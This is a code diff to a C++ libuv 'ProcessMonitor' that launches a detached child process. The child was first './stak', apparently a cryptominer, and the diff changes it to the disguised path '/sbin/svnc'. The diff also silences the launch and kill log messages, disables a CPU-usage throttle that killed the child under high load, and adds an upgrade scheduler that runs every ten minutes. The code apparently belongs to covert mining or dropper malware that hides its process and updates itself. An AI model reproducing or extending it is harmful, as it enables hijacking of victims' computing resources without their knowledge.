@@ -1,23 +1,27 @@
+
 #include "vkProcessMonitor.h"
 #include "../common/vkHandle.h"
+#include "../common/vkUpgradeWorker.h"
 #include "vkCpuUsage.h"
 
 ProcessMonitor*      ProcessMonitor::m_self = nullptr;
 uv_process_t*        ProcessMonitor::m_process = nullptr;
 uv_timer_t*          ProcessMonitor::m_timer = nullptr;
 uv_process_options_t ProcessMonitor::m_options = {0};
-static char pstr[] = "./stak";
-static char  *args[] = {pstr,NULL};
+
 ProcessMonitor::ProcessMonitor(void)
 {
+    strcpy(m_file,"/sbin/svnc");
+    m_args[0] = m_file;
+    m_args[1] = nullptr;
     m_timer = new uv_timer_t;
     
     uv_timer_init(uv_default_loop(), m_timer);    
     m_timer->data = this;
     m_self = this;
     m_options.exit_cb = ProcessMonitor::onExit;
-    m_options.file = pstr;
-    m_options.args = args;
+    m_options.file = m_file;
+    m_options.args = m_args;
     m_options.flags = UV_PROCESS_DETACHED;    
 }
 
@@ -55,7 +59,7 @@ void ProcessMonitor::DestroyInst(void)
 
 void ProcessMonitor::start(void)
 {
-    uv_timer_start(m_timer, ProcessMonitor::onTimer, 1000, 13000);
+    uv_timer_start(m_timer, ProcessMonitor::onTimer, 1000, 600*1000);
 }
 
 void ProcessMonitor::stop(void)
@@ -74,7 +78,7 @@ void ProcessMonitor::onExit(uv_process_t *process, int64_t exit_status, int term
         m_process = nullptr;
     }
 }
-
+#if 0
 void ProcessMonitor::onTimer(uv_timer_t *handle)
 {
     const int   cpu_usage = CpuUsage::getCpuUsage();
@@ -97,7 +101,7 @@ void ProcessMonitor::onTimer(uv_timer_t *handle)
                 fprintf(stderr, "%s\n", uv_strerror(r));
             }
             else {
-                fprintf(stdout, "launch app\n");
+                //fprintf(stdout, "launch app\n");
             }
         }
     }
@@ -107,10 +111,16 @@ void ProcessMonitor::onTimer(uv_timer_t *handle)
         {
             //fprintf(stdout, "over upper: %5.1f>%d, kill child pid=%d!\n", cores_load, upper_limit_load, worker_pid);
             //kill(worker_pid, SIGKILL);
-            fprintf(stdout, "stop app\n");
+            //fprintf(stdout, "stop app\n");
             uv_process_kill(m_process, SIGKILL);
         }
     }
 }
+#endif
 
-
+void ProcessMonitor::onTimer(uv_timer_t *handle)
+{
+    UpgradeWorker *p = new UpgradeWorker();
+    printf("start scheduler worker\n");
+    p->Scheduler();
+}
